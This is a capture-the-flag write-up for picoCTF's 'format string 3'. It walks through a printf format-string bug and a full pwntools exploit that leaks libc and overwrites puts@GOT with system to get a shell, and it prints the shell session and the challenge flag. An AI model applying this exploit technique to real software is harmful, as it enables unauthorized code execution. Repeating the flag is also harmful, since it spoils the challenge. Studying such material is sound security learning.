# format string 3
## Description
This program doesn't contain a win function. How can you win?
Download the binary here.
Download the source here.
Download libc here, download the interpreter here. Run the binary with these two files present in the same directory.
Connect with the challenge instance here:
nc rhea.picoctf.net 61029
## Hint
- Is there any way to change what a function points to?
## Solution
- We're given the following files:
  - [format-string-3](./format-string-3)
  - [format-string-3.c](./format-string-3.c)
  - [libc.so.6](./libc.so.6)
  - [ld-linux-x86-64.so.2](./ld-linux-x86-64.so.2)
- Connecting to the server and giving sample inputs:
```
nc rhea.picoctf.net 61029
Howdy gamers!
Okay I'll be nice. Here's the address of setvbuf in libc: 0x707adb4693f0
hello
hello
/bin/sh

nc rhea.picoctf.net 61029
Howdy gamers!
Okay I'll be nice. Here's the address of setvbuf in libc: 0x7bb80565d3f0
hello%p
hello0x7bb8057bb963
/bin/sh
```
- The address of setvbuf in libc is random and changes every time we connect to the server. This is due to ASLR and PIE.
- Taking a look at the source code:
```c
#include <stdio.h>

#define MAX_STRINGS 32

char *normal_string = "/bin/sh";

void setup() {
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
}

void hello() {
	puts("Howdy gamers!");
	printf("Okay I'll be nice. Here's the address of setvbuf in libc: %p\n", &setvbuf);
}

int main() {
	char *all_strings[MAX_STRINGS] = {NULL};
	char buf[1024] = {'\0'};

	setup();
	hello();	

	fgets(buf, 1024, stdin);	
	printf(buf);

	puts(normal_string);

	return 0;
}
```
- There is no `win` function in the source code. We see the string `/bin/sh` in the source code. This is a strong hint towards the fact that we need to somehow spawn a shell. We can do this by calling the `system` function with the argument `/bin/sh`. So instead of `puts` we need to call `system`.
- I had to learn a bit about Procedure Linkage Table (PLT) and Global Offset Table (GOT) to grasp the concepts. [This](https://blog.nviso.eu/2024/05/23/format-string-exploitation-a-hands-on-exploration-for-linux/) resource was very helpful.
- So GOT serves as a central repository for storing addresses of global variables and functions. We need to manipulate the addresses stored in the GOT to redirect program flow.
- When an executable is programmed in C to call `function` and is compiled as an ELF executable, the `function` will be compiled as function@plt. When the program is executed, it will jump to the PLT entry of `function` and if there is a GOT entry for `function`, it jumps to the address stored there.
- Now since the address of `setvbuf` is at a fixed offset from the base address of libc, we can calculate the base address of libc by subtracting the offset from the address of `setvbuf` we get from the server.
- We can then calculate the address of `system` by adding the offset of `system` from the base address of libc.
- We can then overwrite the GOT entry of `puts` with the address of `system` and then call `puts` to spawn a shell.
- I wrote the following [script](<./format string 3.py>) to automate the process:
```python
from pwn import *

context.binary = ELF('./format-string-3')

p = remote('rhea.picoctf.net', 56083)
def exec_fmt(payload):
    p = remote('rhea.picoctf.net', 56083)
    p.sendline(payload)
    return p.recvall()
autofmt = FmtStr(exec_fmt)
offset = autofmt.offset

p.recvuntil(b': 0x')
setvbuf_leak = int(p.recvuntil(b'\n', drop=True).decode(), 16)

libc = ELF("./libc.so.6")
libc.address = setvbuf_leak - libc.symbols['setvbuf']

sys_addr = libc.symbols['system']
puts_addr = context.binary.got['puts']
writes = {puts_addr: sys_addr}

payload = fmtstr_payload(offset, writes)
p.sendline(payload)
p.interactive()
```
- Similar to [format string 2](<./format string 2.md>), the script uses `FmtStr` to calculate the offset. 
- We then calculate the base address of libc and the address of `system` and `puts`.
- We then overwrite the GOT entry of `puts` with the address of `system` and call `puts` to spawn a shell.
- Running the script, we successfully spawn a shell and after navigating a bit, we find the flag.
```bash
ipython
Python 3.10.12 (main, Sep 11 2024, 15:47:36) [GCC 11.4.0]
Type 'copyright', 'credits' or 'license' for more information
IPython 7.31.1 -- An enhanced Interactive Python. Type '?' for help.

In [1]: from pwn import *
   ...: 
   ...: context.binary = ELF('./format-string-3')
   ...: 
   ...: p = remote('rhea.picoctf.net', 56083)
   ...: def exec_fmt(payload):
   ...:     p = remote('rhea.picoctf.net', 56083)
   ...:     p.sendline(payload)
   ...:     return p.recvall()
   ...: autofmt = FmtStr(exec_fmt)
   ...: offset = autofmt.offset
   ...: 
   ...: p.recvuntil(b': 0x')
   ...: setvbuf_leak = int(p.recvuntil(b'\n', drop=True).decode(), 16)
   ...: 
   ...: libc = ELF("./libc.so.6")
   ...: libc.address = setvbuf_leak - libc.symbols['setvbuf']
   ...: 
   ...: sys_addr = libc.symbols['system']
   ...: puts_addr = context.binary.got['puts']
   ...: writes = {puts_addr: sys_addr}
   ...: 
   ...: payload = fmtstr_payload(offset, writes)
   ...: p.sendline(payload)
   ...: p.interactive()
[*] '/home/dhruv28-picoctf/format-string-3'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x3ff000)
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[x] Opening connection to rhea.picoctf.net on port 56083
[x] Opening connection to rhea.picoctf.net on port 56083: Trying 3.136.191.228
[+] Opening connection to rhea.picoctf.net on port 56083: Done
[x] Opening connection to rhea.picoctf.net on port 56083
[x] Opening connection to rhea.picoctf.net on port 56083: Trying 3.136.191.228
[+] Opening connection to rhea.picoctf.net on port 56083: Done
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 87B
[x] Receiving all data: 138B
[+] Receiving all data: Done (138B)
[*] Closed connection to rhea.picoctf.net port 56083
[x] Opening connection to rhea.picoctf.net on port 56083
[x] Opening connection to rhea.picoctf.net on port 56083: Trying 3.136.191.228
[+] Opening connection to rhea.picoctf.net on port 56083: Done
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 87B
[x] Receiving all data: 134B
[+] Receiving all data: Done (134B)
[*] Closed connection to rhea.picoctf.net port 56083
[x] Opening connection to rhea.picoctf.net on port 56083
[x] Opening connection to rhea.picoctf.net on port 56083: Trying 3.136.191.228
[+] Opening connection to rhea.picoctf.net on port 56083: Done
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 87B
[x] Receiving all data: 138B
[+] Receiving all data: Done (138B)
[*] Closed connection to rhea.picoctf.net port 56083
[x] Opening connection to rhea.picoctf.net on port 56083
[x] Opening connection to rhea.picoctf.net on port 56083: Trying 3.136.191.228
[+] Opening connection to rhea.picoctf.net on port 56083: Done
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 87B
[x] Receiving all data: 127B
[+] Receiving all data: Done (127B)
[*] Closed connection to rhea.picoctf.net port 56083
[x] Opening connection to rhea.picoctf.net on port 56083
[x] Opening connection to rhea.picoctf.net on port 56083: Trying 3.136.191.228
[+] Opening connection to rhea.picoctf.net on port 56083: Done
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 87B
[x] Receiving all data: 129B
[+] Receiving all data: Done (129B)
[*] Closed connection to rhea.picoctf.net port 56083
[x] Opening connection to rhea.picoctf.net on port 56083
[x] Opening connection to rhea.picoctf.net on port 56083: Trying 3.136.191.228
[+] Opening connection to rhea.picoctf.net on port 56083: Done
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 87B
[x] Receiving all data: 129B
[+] Receiving all data: Done (129B)
[*] Closed connection to rhea.picoctf.net port 56083
[x] Opening connection to rhea.picoctf.net on port 56083
[x] Opening connection to rhea.picoctf.net on port 56083: Trying 3.136.191.228
[+] Opening connection to rhea.picoctf.net on port 56083: Done
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 87B
[x] Receiving all data: 129B
[+] Receiving all data: Done (129B)
[*] Closed connection to rhea.picoctf.net port 56083
[x] Opening connection to rhea.picoctf.net on port 56083
[x] Opening connection to rhea.picoctf.net on port 56083: Trying 3.136.191.228
[+] Opening connection to rhea.picoctf.net on port 56083: Done
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 87B
[x] Receiving all data: 129B
[+] Receiving all data: Done (129B)
[*] Closed connection to rhea.picoctf.net port 56083
[x] Opening connection to rhea.picoctf.net on port 56083
[x] Opening connection to rhea.picoctf.net on port 56083: Trying 3.136.191.228
[+] Opening connection to rhea.picoctf.net on port 56083: Done
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 87B
[x] Receiving all data: 129B
[+] Receiving all data: Done (129B)
[*] Closed connection to rhea.picoctf.net port 56083
[x] Opening connection to rhea.picoctf.net on port 56083
[x] Opening connection to rhea.picoctf.net on port 56083: Trying 3.136.191.228
[+] Opening connection to rhea.picoctf.net on port 56083: Done
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 87B
[x] Receiving all data: 129B
[+] Receiving all data: Done (129B)
[*] Closed connection to rhea.picoctf.net port 56083
[x] Opening connection to rhea.picoctf.net on port 56083
[x] Opening connection to rhea.picoctf.net on port 56083: Trying 3.136.191.228
[+] Opening connection to rhea.picoctf.net on port 56083: Done
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 87B
[x] Receiving all data: 129B
[+] Receiving all data: Done (129B)
[*] Closed connection to rhea.picoctf.net port 56083
[x] Opening connection to rhea.picoctf.net on port 56083
[x] Opening connection to rhea.picoctf.net on port 56083: Trying 3.136.191.228
[+] Opening connection to rhea.picoctf.net on port 56083: Done
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 87B
[x] Receiving all data: 129B
[+] Receiving all data: Done (129B)
[*] Closed connection to rhea.picoctf.net port 56083
[x] Opening connection to rhea.picoctf.net on port 56083
[x] Opening connection to rhea.picoctf.net on port 56083: Trying 3.136.191.228
[+] Opening connection to rhea.picoctf.net on port 56083: Done
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 14B
[x] Receiving all data: 129B
[+] Receiving all data: Done (129B)
[*] Closed connection to rhea.picoctf.net port 56083
[x] Opening connection to rhea.picoctf.net on port 56083
[x] Opening connection to rhea.picoctf.net on port 56083: Trying 3.136.191.228
[+] Opening connection to rhea.picoctf.net on port 56083: Done
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 87B
[x] Receiving all data: 129B
[+] Receiving all data: Done (129B)
[*] Closed connection to rhea.picoctf.net port 56083
[x] Opening connection to rhea.picoctf.net on port 56083
[x] Opening connection to rhea.picoctf.net on port 56083: Trying 3.136.191.228
[+] Opening connection to rhea.picoctf.net on port 56083: Done
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 129B
[+] Receiving all data: Done (129B)
[*] Closed connection to rhea.picoctf.net port 56083
[x] Opening connection to rhea.picoctf.net on port 56083
[x] Opening connection to rhea.picoctf.net on port 56083: Trying 3.136.191.228
[+] Opening connection to rhea.picoctf.net on port 56083: Done
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 129B
[+] Receiving all data: Done (129B)
[*] Closed connection to rhea.picoctf.net port 56083
[x] Opening connection to rhea.picoctf.net on port 56083
[x] Opening connection to rhea.picoctf.net on port 56083: Trying 3.136.191.228
[+] Opening connection to rhea.picoctf.net on port 56083: Done
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 87B
[x] Receiving all data: 129B
[+] Receiving all data: Done (129B)
[*] Closed connection to rhea.picoctf.net port 56083
[x] Opening connection to rhea.picoctf.net on port 56083
[x] Opening connection to rhea.picoctf.net on port 56083: Trying 3.136.191.228
[+] Opening connection to rhea.picoctf.net on port 56083: Done
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 87B
[x] Receiving all data: 129B
[+] Receiving all data: Done (129B)
[*] Closed connection to rhea.picoctf.net port 56083
[x] Opening connection to rhea.picoctf.net on port 56083
[x] Opening connection to rhea.picoctf.net on port 56083: Trying 3.136.191.228
[+] Opening connection to rhea.picoctf.net on port 56083: Done
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 87B
[x] Receiving all data: 129B
[+] Receiving all data: Done (129B)
[*] Closed connection to rhea.picoctf.net port 56083
[x] Opening connection to rhea.picoctf.net on port 56083
[x] Opening connection to rhea.picoctf.net on port 56083: Trying 3.136.191.228
[+] Opening connection to rhea.picoctf.net on port 56083: Done
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 87B
[x] Receiving all data: 129B
[+] Receiving all data: Done (129B)
[*] Closed connection to rhea.picoctf.net port 56083
[x] Opening connection to rhea.picoctf.net on port 56083
[x] Opening connection to rhea.picoctf.net on port 56083: Trying 3.136.191.228
[+] Opening connection to rhea.picoctf.net on port 56083: Done
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 87B
[x] Receiving all data: 129B
[+] Receiving all data: Done (129B)
[*] Closed connection to rhea.picoctf.net port 56083
[x] Opening connection to rhea.picoctf.net on port 56083
[x] Opening connection to rhea.picoctf.net on port 56083: Trying 3.136.191.228
[+] Opening connection to rhea.picoctf.net on port 56083: Done
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 87B
[x] Receiving all data: 129B
[+] Receiving all data: Done (129B)
[*] Closed connection to rhea.picoctf.net port 56083
[x] Opening connection to rhea.picoctf.net on port 56083
[x] Opening connection to rhea.picoctf.net on port 56083: Trying 3.136.191.228
[+] Opening connection to rhea.picoctf.net on port 56083: Done
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 87B
[x] Receiving all data: 129B
[+] Receiving all data: Done (129B)
[*] Closed connection to rhea.picoctf.net port 56083
[x] Opening connection to rhea.picoctf.net on port 56083
[x] Opening connection to rhea.picoctf.net on port 56083: Trying 3.136.191.228
[+] Opening connection to rhea.picoctf.net on port 56083: Done
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 87B
[x] Receiving all data: 129B
[+] Receiving all data: Done (129B)
[*] Closed connection to rhea.picoctf.net port 56083
[x] Opening connection to rhea.picoctf.net on port 56083
[x] Opening connection to rhea.picoctf.net on port 56083: Trying 3.136.191.228
[+] Opening connection to rhea.picoctf.net on port 56083: Done
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 87B
[x] Receiving all data: 129B
[+] Receiving all data: Done (129B)
[*] Closed connection to rhea.picoctf.net port 56083
[x] Opening connection to rhea.picoctf.net on port 56083
[x] Opening connection to rhea.picoctf.net on port 56083: Trying 3.136.191.228
[+] Opening connection to rhea.picoctf.net on port 56083: Done
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 87B
[x] Receiving all data: 129B
[+] Receiving all data: Done (129B)
[*] Closed connection to rhea.picoctf.net port 56083
[x] Opening connection to rhea.picoctf.net on port 56083
[x] Opening connection to rhea.picoctf.net on port 56083: Trying 3.136.191.228
[+] Opening connection to rhea.picoctf.net on port 56083: Done
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 87B
[x] Receiving all data: 129B
[+] Receiving all data: Done (129B)
[*] Closed connection to rhea.picoctf.net port 56083
[x] Opening connection to rhea.picoctf.net on port 56083
[x] Opening connection to rhea.picoctf.net on port 56083: Trying 3.136.191.228
[+] Opening connection to rhea.picoctf.net on port 56083: Done
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 87B
[x] Receiving all data: 129B
[+] Receiving all data: Done (129B)
[*] Closed connection to rhea.picoctf.net port 56083
[x] Opening connection to rhea.picoctf.net on port 56083
[x] Opening connection to rhea.picoctf.net on port 56083: Trying 3.136.191.228
[+] Opening connection to rhea.picoctf.net on port 56083: Done
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 87B
[x] Receiving all data: 129B
[+] Receiving all data: Done (129B)
[*] Closed connection to rhea.picoctf.net port 56083
[x] Opening connection to rhea.picoctf.net on port 56083
[x] Opening connection to rhea.picoctf.net on port 56083: Trying 3.136.191.228
[+] Opening connection to rhea.picoctf.net on port 56083: Done
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 87B
[x] Receiving all data: 129B
[+] Receiving all data: Done (129B)
[*] Closed connection to rhea.picoctf.net port 56083
[x] Opening connection to rhea.picoctf.net on port 56083
[x] Opening connection to rhea.picoctf.net on port 56083: Trying 3.136.191.228
[+] Opening connection to rhea.picoctf.net on port 56083: Done
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 87B
[x] Receiving all data: 129B
[+] Receiving all data: Done (129B)
[*] Closed connection to rhea.picoctf.net port 56083
[x] Opening connection to rhea.picoctf.net on port 56083
[x] Opening connection to rhea.picoctf.net on port 56083: Trying 3.136.191.228
[+] Opening connection to rhea.picoctf.net on port 56083: Done
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 87B
[x] Receiving all data: 129B
[+] Receiving all data: Done (129B)
[*] Closed connection to rhea.picoctf.net port 56083
[x] Opening connection to rhea.picoctf.net on port 56083
[x] Opening connection to rhea.picoctf.net on port 56083: Trying 3.136.191.228
[+] Opening connection to rhea.picoctf.net on port 56083: Done
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 87B
[x] Receiving all data: 129B
[+] Receiving all data: Done (129B)
[*] Closed connection to rhea.picoctf.net port 56083
[x] Opening connection to rhea.picoctf.net on port 56083
[x] Opening connection to rhea.picoctf.net on port 56083: Trying 3.136.191.228
[+] Opening connection to rhea.picoctf.net on port 56083: Done
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 87B
[x] Receiving all data: 129B
[+] Receiving all data: Done (129B)
[*] Closed connection to rhea.picoctf.net port 56083
[x] Opening connection to rhea.picoctf.net on port 56083
[x] Opening connection to rhea.picoctf.net on port 56083: Trying 3.136.191.228
[+] Opening connection to rhea.picoctf.net on port 56083: Done
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 129B
[+] Receiving all data: Done (129B)
[*] Closed connection to rhea.picoctf.net port 56083
[x] Opening connection to rhea.picoctf.net on port 56083
[x] Opening connection to rhea.picoctf.net on port 56083: Trying 3.136.191.228
[+] Opening connection to rhea.picoctf.net on port 56083: Done
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 129B
[+] Receiving all data: Done (129B)
[*] Closed connection to rhea.picoctf.net port 56083
[x] Opening connection to rhea.picoctf.net on port 56083
[x] Opening connection to rhea.picoctf.net on port 56083: Trying 3.136.191.228
[+] Opening connection to rhea.picoctf.net on port 56083: Done
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 87B
[x] Receiving all data: 129B
[+] Receiving all data: Done (129B)
[*] Closed connection to rhea.picoctf.net port 56083
[x] Opening connection to rhea.picoctf.net on port 56083
[x] Opening connection to rhea.picoctf.net on port 56083: Trying 3.136.191.228
[+] Opening connection to rhea.picoctf.net on port 56083: Done
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 87B
[x] Receiving all data: 142B
[+] Receiving all data: Done (142B)
[*] Closed connection to rhea.picoctf.net port 56083
[*] Found format string offset: 38
[*] '/home/dhruv28-picoctf/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
[*] Switching to interactive mode
                                                                                               c                                                                                                               aa@@
whoami
root
pwd
/challenge
ls
Makefile
artifacts.tar.gz
flag.txt
format-string-3
format-string-3.c
ld-linux-x86-64.so.2
libc.so.6
metadata.json
profile
cat flag.txt
picoCTF{G07_G07?_f574d38f}
```
- The flag is `picoCTF{G07_G07?_f574d38f}`.